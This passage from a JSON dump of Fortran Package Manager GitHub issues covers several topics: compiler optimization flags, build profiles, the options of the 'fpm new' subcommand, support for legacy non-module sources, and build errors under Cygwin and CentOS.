                    "text": "To aid the discussion I have tried to summarize some of the available optimization flags. Note that the specific optimizations will slightly differ between compilers. As a single example, to optimize for executable size, gfortran has the flag -Os, however the Intel documentation recommends using -O1.\n(perhaps this table can also be moved to a Wiki)\n\n\n\nFlag\ngfortran\nifort\nnagfor\nflang\nCray\nIBM\n\n\n\n\n-O\nequal to -O1\n/\nequal to -O2\nequal to -O2\n\nequal to -O2\n\n\n-O0\nno optimization (default)\nno optimization\nno optimization\ndisable optimization\ndisable optimization\ndisable optimization\n\n\n-O1\noptimize\noptimize for size\nminimal quick optimisation\nbetween -O0 and -O2\nconservative optimization\nno effect, reserved for future use\n\n\n-O2\noptimize even more\nmaximize speed (default)\nnormal optimisation (default)\nmoderate optimization\ndefault optimization\noptimize for performance\n\n\n-O3\noptimize yet more\nsimilar to -O2 with additional floating point optimizations\nfurther optimisation\nfull optimization\naggresive optimisation\nadditional optimization (similar to gfortran -Ofast)\n\n\n-O4\n/\n/\nmaximal optimisation\nreserved for future use\n/\naggresive optimization\n\n\n-O5\n/\n/\n/\n/\n/\nequal to -O4 with additional interprocedure analysis\n\n\n-Ofast\nsimilar to -O3 with unsafe math\n/\n/\nsimilar to -O3 with   further math optimizations\n/\n/\n\n\n-fast\n/\nmaximize speed across   entire program\n/\n/\n/\n/\n\n\n-Os\noptimize for size\n/\n/\nlike -O2 but reduces code   size\n/\n/\n\n\n-Oz\n/\n/\n/\nlike -Os, but reduces   code size further\n/\n/\n\n\n-Og\nturns on optimizations   which do not interfere with debugging\n/\n/\n/\n/\n/\n\n\n\nSince we are limited by the available compilers for CI, I would suggest to only handle the -O0, -O1, -O2, and -O3 flags for now, which are common for most Fortran compilers."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 15:12:57+00:00",
                    "text": "With #322 the package scope of the source files is now available in the fpm model, extending each package object in the fpm model by its compilation profile would allow to implement customized arguments on per package basis.\nThe main issue to solve is the presentation of the build arguments in the package manifest.\nI would suggest to use a table of tables either in build or in the top-level:\n[build.profile.*]  # with * = debug, release, ...\nThe command line argument could be --profile <debug|release|...> to access the compilation profile.\nWe should abstract as many options as possible in specific entries in a profile (optimization, fast-math, ...), but we won't get around implementing compiler vendor specific arguments. Again I would suggest to represent them with a table of tables:\n[build.profile.*]  # with * = debug, release, ...\n[build.profile.*.compile-args]  # link-args, global-args ?\ngnu = [\"...\", \"...\"]\nintel = [\"...\", \"...\"]  # Intel with GCC like CLI on Unix\nintel-cl = [\"...\", \"...\"]  # Intel with MSVS like CLI on Windows\nflang = [\"...\", \"...\"]\n# or inverted?\n[build.profile.*.gnu]\ncompile-args = [\"...\", \"...\"]\nlink-args = [\"...\", \"...\"]\nglobal-args = [\"...\", \"...\"]\nThe allowed IDs should preferably match existing IDs used in CMake or meson. Internally, all abstracted options could be implemented using the same representation as the compile-args table.\nWe will require three kinds of arguments, compile arguments for the current project (e.g. -O3), link arguments for the current project (e.g. -flto) and all dependent projects and global compile arguments for all dependent projects (e.g. -fopenmp, -fast-math). We can than fine-tune the exact scopes of the arguments at a later stage.\nImplementing the three different kind of arguments allows us to prototype profiles for the different compilers without having to modify fpm. Options and profiles we choose to stabilize in fpm can get specific entries in the profile or build tables later."
                }
            ]
        },
        {
            "number": 111,
            "user": "certik",
            "date": "2020-07-06 20:09:15+00:00",
            "title": "Introduce --lib to initalize a project with a library",
            "text": "Currently this is the default, but there should be an option for the default value also (in addition I propose that this should not be the default in #109).",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-06 21:22:27+00:00",
                    "text": "I would combine this, #109, and #110 into a single issue, as these are all related.\nFor renaming the command line flags, I'm open to that. I tend to lean towards the more verbose to help make things more \"self documenting\", but understand that's not always the most popular way for everything.\nIn general, there are 3 (partially) independent pieces that fpm might create for a new project: src/project.f90, app/main.f90, and test/main.f90. Let's say the command line flags for each are --app, --lib, and --test.\nIf I understand correctly, you're suggesting that the default should be fpm new --app --lib name.\nIn order to not include an app, you'd then want a --no-app flag. So, should we have both flags, or just the ones for the opposite of the default? Having both would imply a total of 6 flags, each of which is mutually exclusive with the other; --app or --no-app, --lib or --no-lib, and --test or --no-test. But, we only really need the flags --no-app, --no-lib, and --test. And then a user can't actually specify contradictory flags, because there aren't any.\nExcept for one question. Should we allow fpm new --no-lib --test name? It doesn't actually break anything, but is kind of strange, because at that point what are you going to be testing?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-06 22:16:39+00:00",
                    "text": "Good point. In Cargo, the --lib and --bin (as Cargo calls it) are mutually exclusive, so specifying --lib means no --bin.\nGiven the slight differences in Fortran and Rust and how modules are called, we can change this and figure out what makes sense for Fortran.\nBut the naming and default I think can be the same. \"fpm new\" would create the default app / executable. In addition, it can still create a library. Perhaps we'll always create a library, so perhaps --lib will always be on.\nAs long as:\nfpm new x\ncd x\nfpm run\n\nworks and executes the executable, then I am fine. The above I feel will be a very common workflow to test something out, whether to test out some library, or some Fortran construct, or some quick idea.\nI think you start a new Fortran library much less often. Sort of like writing a Python script vs starting a new Python library that you upload on pypi. I do the script much more often.\nLet's get an agreement on that first. Since you agree with the renaming of the options, those are the two main things I care about. We can discuss how exactly the --lib works later as we gain more experience with fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 14:02:50+00:00",
                    "text": "I would prefer the default create all three, as they do not hurt anything and that you have one switch \"-with\" that can take the names app,test,lib that when specified only creates those elments, so the default would be\nfpm new -MYNAME  -with app,lib,test\nbut that if you just wanted the src/ directory as is the current default you would enter\nfpm new MYNAME -with lib\nor that there are three switches --lib --app and --test and if any of them is specified only specified ones are generated. So the default could be whatever but as soon as you said --lib the others would only be created if listed, so\nfpm new MYNAME # does whatever everyone wants to be the default\nfpm new MYNAME -lib  # only builds src/\nfpm new MYNAME -lib -app -test # builds all three\nI think the second is the most like other package managers.  I was thinking maybe there should just be a switch that takes a name, and there could be a name for each of the examples on the web page so you could enter something like\nfpm new MYNAME  project_with_library\nas  \"new\" (at least currently) only allows one directory name so a second name could be a \"type\". So something like\nfpm new  MYNAME lib test src  \nis another way to go\nI would have to reactivate short/long names in M_CLI2 or use another parser (but adding it back is trivial) but if\nyou went with the --lib --app --test you could have short names so\nfpm new MYNAME -lat\nMy personal favorite is\nfpm new  MYNAME # creates all three\nfpm  new MYNAME --lib --app # creates just src/ and app/\nand no shorter names. I tend to like descriptive names as well so when you find a command in a script it is self-descriptive. A private library I have allows short names by popular demand but only if you have a tty so you have to use long names in a batch job (which I have had more than one argument about :>)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 02:20:07+00:00",
                    "text": "I would propose a PR that changes the new subcommand to the following to close #109, #110, and #111:\n   new(1) - the fpm(1) subcommand to initialize a new project\n\nSYNOPSIS\n fpm new NAME [--lib] [--app] [--test]\n\n fpm new --help|--version\n\nDESCRIPTION\n \"fpm new\" creates a new programming project in a new directory.\n\n The \"new\" subcommand creates a directory with the specified\n name and runs the command \"git init\" in that directory and\n populates it with an example \"fpm.toml\" file, a src/, test/,\n and app/ directory with trivial example Fortran source files\n and a \".gitignore\" file for ignoring the build/ directory\n where fpm-generated output will be placed:\n\n    NAME/\n      fpm.toml\n      .gitignore\n      src/\n          name.f90\n      app/\n          main.f90\n      test/\n          main.f90\n\n Remember to update the information in the sample \"fpm.toml\"\n file with such information as your name and e-mail address.\n\nOPTIONS\n NAME   the name of the project directory to create. The name\n        must be a valid Fortran name composed of 1 to 63\n        ASCII alphanumeric characters and underscores,\n        starting with a letter.\n\n The default is to create all of the src/, app/, and test/\n directories. If any of the following options are specified\n then only specified subdirectories are generated:\n\n --lib       create directory src/ and a placeholder module\n             named \"NAME.f90\" for use with subcommand \"build\".\n --app       create directory app/ and a placeholder main\n             program for use with subcommand \"run\".\n --test      create directory test/ and a placeholder program\n             for use with the subcommand \"test\".\n\n So the default is equivalent to \"fpm NAME --lib --app --test\".\n\n --help      print this help and exit\n --version   print program version information and exit\n\nEXAMPLES\n Sample use\n\n   fpm new myproject  # create new project directory and seed it\n   cd myproject       # Enter the new directory\n   # and run commands such as\n   fpm build\n   fpm run            # run example application program\n   fpm test           # run example test program\nSEE ALSO\n The fpm(1) home page at https://github.com/fortran-lang/fpm\n\n Registered packages are at https://fortran-lang.org/packages\n\nI would be making a PR only for the Fortran version assuming the pending \"NEW\" PR is accepted."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 16:57:26+00:00",
                    "text": "@urbanjost , I like your proposal. It's simple and understandable. As a note though, --test would essentially be useless without --lib (as I noted in my prior comment), because then there's no code to test. Should --test imply --lib or should we report an error, or maybe just a warning and create the project anyway?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 18:54:45+00:00",
                    "text": "If you were refreshing a directory that already had src/ or app/ it could make sense.  I think if you have --test and src/ and app/ do not exist I think I would prefer a warning to an error,  but I suppose you could be in an existing package directory where the TOML file was used to create alternate directories to src/ and app/ so it might not be trivial to produce a warning only when there is no source or applications or other test directories but a warning would still be reasonable and would not have to be as rigourous as an error.  It is currently a difference between h-fpm and f-fpm that you can do \"fpm new myproject --lib\" and then\nlater do \"fpm new myproject --test\"  which is what I did as a new h-fpm user and got an error. This was before I knew much about how a project was even structured; as I now know I could have just done a \"mkdir /tmp\" and put a file in it called \"main.f90\" but as a first-time user I was confused; which was the motivation for making the tweek to allow the --test by itself;\nbut I can also see a new user doing something like \"fpm --test\". I have not tried that (will shortly) but I do realiize that just entering \"fpm new -app\" would create a test program with a missing module right now too. Maybe allowing a \"refresh\" wasn't as simple an idea as I thought. Mulling it a bit but a warning for both \"fpm -test\" and \"fpm -app\" when src/ does not exist seems like a minimal change needed. If \"fpm -app\" is done and src/ does not exist should it write a sample program with no use too? Never as simple as it seems."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 19:16:35+00:00",
                    "text": "Actually, I would expect fpm new to be an error if the folder already exists. For existing folders or fpm packages, I would expect to have commands fpm init or fpm reconfigure respectively.\nGood catch on fpm new --app. I would expect that to create a valid project though. Probably just:\nprogram project_name\n  implicit none\n\n  print *, \"Hello, project_name!\"\nend program"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 02:53:45+00:00",
                    "text": "With the current lack of the additional commands I am not sure which way to go. My personal experience is that the functionality is needed to work with an existing directory but I see the point that it might be better split  into mutlple\ncommands.\nBut after recently reviewing some other source package managers I prefer the current simplicity of the fpm(1) interface. Maybe it is inevitable that fpm(1) bloats as well if it becomes popular but I am torn between just disabling the ability to work with an existing directory for now and letting the project evolve new commands (the lack of that functionality was vexing to me when I was first moving projects to work with fpm(1)),\nPerhaps just making options for \"new\" like --update/-reconfigure and -init/-auto and just making the default be that the directory must not exist, that a switch like --update allow for a directory to exist but otherwise act like new is cleaner.\nLater something like -init/-auto could search an existing directory tree using the features recently added to build and write a new toml file describing what it finds . Maybe that really does deserve a seperate command, and it would be hard to differntiate between tests and demos and application programs if you assumed it would just conform to what it finds (so that is why I was thinking it would write a toml file which could be reorganized but would initially just put all programs under [executable] with a blank [test] that you could easily move files.\nIf no one wants \"new\" to work with existing directories I should turn it off as it would be hard to remove once people are used to it, but it would leave a hole in the functionality I consider basic. Just making the default be src/,test/,app/ would make it much less likely a new user would immediately hit the issue, I believe. That is based on the idea a new user is most likely to just enter \"fpm new\" and not try the switches until they got past the basics; which is only a hunch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 03:48:44+00:00",
                    "text": "After trying a bunch of stuff I think init should be added at some point but that new  by default not allowing the directory to exist by default makes sense; but adding a -backfill switch that says new does exactly what it does with an empty directory but only creates missing files is a reasonable behavior that could stay permanent would satisfy\nyour expected behavior but allow for new to work with an existing directory (conservatively not replacing existing files so it does not overwrite the README.md file you spent all night on) to provide the functionality I do not want to see missing:\n ffpm new A --lib\n ffpm new A --app\n ffpm new A --app --backfill\n\nprovides\nffpm new A --lib\n + mkdir -p A\n + cd A\n + mkdir -p A/src\n + cd A;git init\nInitialized empty Git repository in /home/urbanjs/venus/V600/github/f-fpm/fpm/A/.git/\n\n+ ffpm new A --app\nfpm::new<ERROR> A already exists.\n        perhaps you wanted to add --backfill ?\n\n###+ ffpm new A --app --backfill\n + mkdir -p A\n + cd A\nfpm::new<WARNING> A/.gitignore already exists. Not overwriting\nfpm::new<WARNING> A/README.md already exists. Not overwriting\n + mkdir -p A/app\nfpm::new<WARNING> A/fpm.toml already exists. Not overwriting\n + cd A;git init\nReinitialized existing Git repository in /home/urbanjs/venus/V600/github/f-fpm/fpm/A/.git/\n[urbanjs@localhost fpm]$"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 04:05:52+00:00",
                    "text": "NAME\n   new(1) - the fpm(1) subcommand to initialize a new project\nSYNOPSIS\n fpm new NAME [--lib] [--app] [--test] [--backfill]\n\n fpm new --help|--version\n\nDESCRIPTION\n \"fpm new\" creates a new programming project in a new directory.\n\n The \"new\" subcommand creates a directory with the specified\n name and runs the command \"git init\" in that directory and\n populates it with an example \"fpm.toml\" file, a src/, test/,\n and app/ directory with trivial example Fortran source files\n and a \".gitignore\" file for ignoring the build/ directory\n (where fpm-generated output will be placed):\n\n    NAME/\n      fpm.toml\n      .gitignore\n      src/\n          NAME.f90\n      app/\n          main.f90\n      test/\n          main.f90\n\n Remember to update the information in the sample \"fpm.toml\"\n file with such information as your name and e-mail address.\n\nOPTIONS\n NAME   the name of the project directory to create. The name\n        must be a valid Fortran name composed of 1 to 63\n        ASCII alphanumeric characters and underscores,\n        starting with a letter.\n\n The default is to create all of the src/, app/, and test/\n directories. If any of the following options are specified\n then only specified subdirectories are generated:\n\n --lib       create directory src/ and a placeholder module\n             named \"NAME.f90\" for use with subcommand \"build\".\n --app       create directory app/ and a placeholder main\n             program for use with subcommand \"run\".\n --test      create directory test/ and a placeholder program\n             for use with the subcommand \"test\". Note that used\n             without --lib it does not really have anything to test.\n\n So the default is equivalent to \"fpm NAME --lib --app --test\".\n\n --backfill  By default the directory must not exist. If this\n             option is present the directory may pre-exist and\n             only subdirectories and files that do not\n             already exist will be created. For example, if you\n             previously entered \"fpm new myname -lib\" entering\n             \"fpm new myname -backfill\" will create the missing\n             app/ and test/ directories and missing programs.\n\n --help      print this help and exit\n --version   print program version information and exit\n\nEXAMPLES\n Sample use\n\n   fpm new myproject  # create new project directory and seed it\n   cd myproject       # Enter the new directory\n   # and run commands such as\n   fpm build\n   fpm run            # run example application program\n   fpm test           # run example test program\nSEE ALSO\n The fpm(1) home page at https://github.com/fortran-lang/fpm\n\n Registered packages are at https://fortran-lang.org/packages"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-04 15:38:23+00:00",
                    "text": "perhaps an out-of-the-box feature, but the intrinsic-manages page I had has a module built by a bash shell (in .gitignore) that converts the manpage source files into a module M_intrinsics that contains all the manpage text. In my own test version of fpm I was thinking that the \"fpm help\" syntax versus \"fpm --help\" which several package managers and git support could have supplemental text on usage and the toml file so I added that module to test with where you can enter an intrinsic name on the help command and get a plain-text display of the man page. A copy of M_intrinisics could easily be captured to keep it up to date or a snapshot could be included; but especially since non-*nix platforms do not have man(1) I thought I would mention it.\nIt also makes a good test for ANSI color sequences like in M_escape but I did not add the colorizer stuff. Essentially if the topic is not found by the help command instead of quitting it calls M_intrinsics. It allows the call to the intrinsics to be case-insensitive so if there is intrinsic called build you can still  get to the intrinsic description. \"fpm help build\" displays the fpm help for the build subcommand, but \"fpm help BUILD\" would display the intrinsic. I mention that here because I have a version that implements the changes mentioned above for review if there is no further discussion here that I could the manpages in. I could argue myself that is overloading, but it is a feature other package managers or methods do not provide that is reasonably useful. It says on the page to \"think outside of the box\", right?"
                }
            ]
        },
        {
            "number": 110,
            "user": "certik",
            "date": "2020-07-06 20:07:33+00:00",
            "title": "Rename --with-executable to --bin (or --app)",
            "text": "So that it is easier to type. Although in #109 I argue it should be the default.",
            "comments": []
        },
        {
            "number": 109,
            "user": "certik",
            "date": "2020-07-06 20:05:55+00:00",
            "title": "fpm new should do --with-executable by default",
            "text": "That is what Cargo does and what I also find intuitive. Very common when I want to just try something out in Fortran.",
            "comments": []
        },
        {
            "number": 108,
            "user": "milancurcic",
            "date": "2020-06-24 16:15:59+00:00",
            "title": "rename reference to other fpm",
            "text": "Minor change to the README to not use the word \"effing\" when referring to the other fpm.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-24 16:26:59+00:00",
                    "text": "Merging as previously agreed on by @certik and @everythingfunctional ."
                },
                {
                    "user": "certik",
                    "date": "2020-06-24 16:28:03+00:00",
                    "text": "+1, thank you @milancurcic !"
                }
            ]
        },
        {
            "number": 107,
            "user": "ivan-pi",
            "date": "2020-06-21 15:21:22+00:00",
            "title": "Projects including legacy files",
            "text": "I've been trying to get fpm to work with some old-school packages like MINPACK: https://github.com/certik/minpack. These projects are generally just a bunch of fixed format \".f\" files. For modern applications that rely on such legacy codes, an interface module is the first step towards safe function calls.\nTrying to run fpm build on @certik's MINPACK fails with errors akin to:\nfpm build --release\n# gfortran (for build/gfortran_release/minpack/rwupdt.o build/gfortran_release/minpack/rwupdt.mod)\n# gfortran (for build/gfortran_release/minpack/dmchar.o build/gfortran_release/minpack/dmchar.mod)\n# gfortran (for build/gfortran_release/minpack/lmpar.o build/gfortran_release/minpack/lmpar.mod)\n# gfortran (for build/gfortran_release/minpack/hybrd.o build/gfortran_release/minpack/hybrd.mod)\nfpm: Error when running Shake build system:\n  at want, called at src/Build.hs:205:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/libminpack.a\n  at need, called at src/Build.hs:203:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/rwupdt.o\n  at &%>, called at src/Build.hs:183:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/rwupdt.o build/gfortran_release/minpack/rwupdt.mod\n  at error, called at src/Development/Shake/Internal/Rules/Files.hs:245:13 in shake-0.18.5-44KSA7uQF2VObxzEvLYZx:Development.Shake.Internal.Rules.Files\n* Raised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\n  build/gfortran_release/minpack/rwupdt.o\n  build/gfortran_release/minpack/rwupdt.mod - MISSING\n\nI understand that fpm is expecting to find a module file for each single \".f\" file. Is it possible to somehow work around this? The farthest I could get it in the fpm source was to remove to the \"-Wimplicit-interface\" flag which was creating lots of warnings \ud83d\ude48 .\nAm I right to think fpm is currently most suitable for projects composed of multiple module files?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:55:04+00:00",
                    "text": "I was playing around with gtk-fortran and I found a work-around for non-module sources by renaming them to .in files so that fpm ignored them and including them with the include statement in a module.\nIt's not ideal and I'm not sure what the plan is for supporting non-module sources but I think they should be supported in some form.\nPerhaps the larger question is whether we will make fpm flexible enough to support legacy packages in their original form or require restructuring of such packages; this latter option is not as extreme as it sounds since for some packages, fpm support will be brought through a third-party fork anyway (i.e. not via the upstream repo)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 21:47:46+00:00",
                    "text": "At the moment, fpm is only really targeted at projects with modules. At some point we may support non-module sources, but it may be some time before we get to it.\n@LKedward , clever workaround. I may even suggest that as a recommended migration path.\nIn the mean time, there is always the out that fpm now supports custom build scripts or Makefiles (with some specific requirements)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:17:28+00:00",
                    "text": "We have to support non-module sources. But this might be a feature to put into the Fortran based fpm to keep the Haskell based on minimal to be used in bootstrapping."
                }
            ]
        },
        {
            "number": 106,
            "user": "arjenmarkus",
            "date": "2020-06-21 12:28:18+00:00",
            "title": "Error message on Cygwin - \"pwd -W\"",
            "text": "I have tried to build fpm on Windows/Cygwin and got an error message. The output to screen was:\n$ stack build\nPreparing to install GHC to an isolated location.\nThis will not interfere with any system-level installation.\nDownloaded ghc-8.6.5.\nAlready downloaded.\nAlready downloaded.\nDecompressing ghc-8.6.5.tar.xz...\n7-Zip 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18\nProcessing archive: C:\\Users\\markus\\AppData\\Local\\Programs\\stack\\x86_64-windows\\ghc-8.6.5.tar.xz\nExtracting  ghc-8.6.5.tar\nEverything is Ok\nSize:       1773445120\nCompressed: 280280296\nExtracting ghc-8.6.5.tar...\nExtracted total of 9780 files from ghc-8.6.5.tar\nGHC installed to C:\\Users\\markus\\AppData\\Local\\Programs\\stack\\x86_64-windows\\ghc-8.6.5\nCloning 536a5e6ffb148d0dd4e4c4b120913a6744097676 from https://github.com/kowainik/tomland.git\nReceived ExitFailure 1 when running\nRaw command: \"C:\\cygwin\\bin\\git.EXE\" submodule update --init --recursive\nRun from: C:\\cygwin\\tmp\\with-repo1848\\cloned\nStandard error:\n/usr/libexec/git-core/git-sh-setup: line 344: pwd: -W: invalid option\npwd: usage: pwd [-LP]\nUnable to determine absolute path of git directory\nApparently, an option -W to the \"pwd\" command is being used that does not exist in the Cygwin version of \"pwd\".\nHow to proceed?",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-21 12:36:06+00:00",
                    "text": "The Linux version requires that I install parts of \"stack\" in /usr/local/bin. Unfortunately, I do not have root/sudo access to the Linux systems I can log on to, so that makes it difficult for me to test fpm on Linux."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:57:57+00:00",
                    "text": "Hi @arjenmarkus, if you don't have root access on linux, please follow the manual installation procedure for stack."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 08:28:32+00:00",
                    "text": "The cygwin error appears to be a fundamental incompatibility between stack and the cygwin environment (at least for this command) - I've been able to run stack build successfully on Windows via command prompt after installing git for windows. I haven't verified stack test in command prompt because I use gfortran via msys2.\nI don't see any reason why fpm built in this manner won't subsequently work from within cygwin.\nAside: interestingly, stack appears to install the msys2 environment on windows when stack build is run. msys2 is a newer fork of cygwin which I switched to (from cygwin) a year ago - I find I have much fewer compatibility problems with msys2."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 09:26:05+00:00",
                    "text": "Hi Laurence,\n\nthanks for that reference. I hoped this morning that I might be able to use\na VM for Linux, but that fails - sigh. Oh well, the instructions should\nhelp me solve that via the regular machine.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 09:58 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Hi @arjenmarkus <https://github.com/arjenmarkus>, if you don't have root\n access on linux, please follow the manual installation procedure\n <https://docs.haskellstack.org/en/stable/install_and_upgrade/#manual-download_2>\n for stack.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#106 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7ROV7PMBUWOC2VIWDRX4FJHANCNFSM4OD2ZINA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 09:28:31+00:00",
                    "text": "Hi Laurence,\n\none reason for sticking to Cygwin for me is the better (?) support for\ninstalling packages. I have MinGW-w64/MSYS2 installed as well, perhaps\nI should indeed try it that way too.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 10:28 schreef Laurence Kedward <notifications@github.com>:\n\u2026\n\n The cygwin error appears to be a fundamental incompatibility between stack and the cygwin environment (at least for this command) - I've been able to run stack build successfully on Windows via command prompt after installing git for windows. I haven't verified stack test in command prompt because I use gfortran via msys2.\n I don't see any reason why fpm built in this manner won't subsequently work from within cygwin.\n\n Aside: interestingly, stack appears to install the msys2 environment on windows when stack build is run. msys2 is a newer fork of cygwin which I switched to (from cygwin) a year ago - I find I have much fewer compatibility problems with msys2.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 09:57:24+00:00",
                    "text": "Hi Arjen,\n\none reason for sticking to Cygwin for me is the better (?) support for installing packages.\n\nThis is a fair point - it would be good to support running fpm on Cygwin, even if that means building fpm outside of Cygwin as I demonstrated.\nLaurence"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 14:20:15+00:00",
                    "text": "Hi Laurence,\n\njust tried this, but now the \"stack build\" command produces the following\noutput;\n stack build\nNo setup information found for ghc-8.6.5 on your platform.\nThis probably means a GHC bindist has not yet been added for OS key\n'linux64-gmp4'.\nSupported versions: ghc-7.8.4, ghc-7.10.2, ghc-7.10.3, ghc-8.0.1,\nghc-8.0.2, ghc-8.2.1, ghc-8.2.2, ghc-8.4.2\n\nI am not sure this is relevant, but the OS is fairly old - CentOS 6, if I\nam not mistaken.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 09:58 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Hi @arjenmarkus <https://github.com/arjenmarkus>, if you don't have root\n access on linux, please follow the manual installation procedure\n <https://docs.haskellstack.org/en/stable/install_and_upgrade/#manual-download_2>\n for stack.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#106 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7ROV7PMBUWOC2VIWDRX4FJHANCNFSM4OD2ZINA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 17:29:55+00:00",
                    "text": "Well, the good news is that after installing the version of stack and git\nfor \"plain Windows\", building fpm went smoothly and I could build a simple\n(one-source-file) program. (Some juggling required: I have gfortran\ninstalled for Cygwin and MinGW-w64/MSYS2, not for \"plain Windows\", but from\na Cygwin command window, it works fine)\n\nRegards,\n\nArjen\n\n\n\n\nOp ma 22 jun. 2020 om 16:20 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n Hi Laurence,\n\n just tried this, but now the \"stack build\" command produces the following\n output;\n\n > stack build\n No setup information found for ghc-8.6.5 on your platform.\n This probably means a GHC bindist has not yet been added for OS key\n 'linux64-gmp4'.\n Supported versions: ghc-7.8.4, ghc-7.10.2, ghc-7.10.3, ghc-8.0.1,\n ghc-8.0.2, ghc-8.2.1, ghc-8.2.2, ghc-8.4.2\n\n I am not sure this is relevant, but the OS is fairly old - CentOS 6, if I\n am not mistaken.\n\n Regards,\n\n Arjen\n\n Op ma 22 jun. 2020 om 09:58 schreef Laurence Kedward <\n ***@***.***>:\n\n> Hi @arjenmarkus <https://github.com/arjenmarkus>, if you don't have root\n> access on linux, please follow the manual installation procedure\n> <https://docs.haskellstack.org/en/stable/install_and_upgrade/#manual-download_2>\n> for stack.\n>\n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub\n> <#106 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR7ROV7PMBUWOC2VIWDRX4FJHANCNFSM4OD2ZINA>\n> .\n>"
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 18:15:29+00:00",
                    "text": "Hi Arjen,\nUnfortunately I won't be much help with the CentOS error but I'm glad you were able to get it working on Windows also.\nAre you able to run stack test in the fpm root folder under Cygwin? I was encountering an error with the makefile test case when I did this under msys2.\nLaurence\nFor future users: it seems stack build is incompatible with the Cygwin environment, but fpm can still be used in Cygwin if built in \"Plain Windows\" as done by myself and Arjen."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-06-22 18:56:58+00:00",
                    "text": "Hi Laurence,\n\nI just ran \"stack test\" and I get errors as well:\n\ngfortran -c -J/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile\n -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g\n-fbounds-check -fcheck-array-temporaries -fbacktrace -o\n/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile/hello_makefile.o\nsrc/hello_makefile.f90\nf951: Warning: Nonexistent include directory\n\u2018/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile\u2019\n[-Wmissing-include-dirs]\nsrc/hello_makefile.f90:10:25:\n\n   10 | end module hello_makefile\n      |                         1\nFatal Error: Cannot open module file\n\u2018/fortran/fpm/fpm/test/example_packages/with_makefile/build/gfortran_debug/with_makefile/hello_makefile.mod0\u2019\nfor writing at (1): No such file or directory\ncompilation terminated.\n\nSo, indeed the same case is failing here as well.\n\nRegards,\n\nArjen\n\nOp ma 22 jun. 2020 om 20:15 schreef Laurence Kedward <notifications@github.com>:\n\u2026\n\n Hi Arjen,\n Unfortunately I won't be much help with the CentOS error but I'm glad you were able to get it working on Windows also.\n Are you able to run stack test in the fpm root folder under Cygwin? I was encountering an error with the makefile test case when I did this under msys2.\n\n Laurence\n\n For future users: it seems stack build is incompatible with the Cygwin environment, but fpm can still be used in Cygwin if built in \"Plain Windows\" as done by myself and Arjen.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-23 08:32:38+00:00",
                    "text": "Hi Arjen,\nThanks for confirming - I wasn't sure if something was wrong with my msys2 setup.\nNot sure what the problem is, but it looks like it only affects the makefile builds.\nRegards,\nLaurence"
                }
            ]
        },
        {
            "number": 105,
            "user": "ivan-pi",
            "date": "2020-06-21 09:20:09+00:00",
            "title": "Projects with multiple drivers",
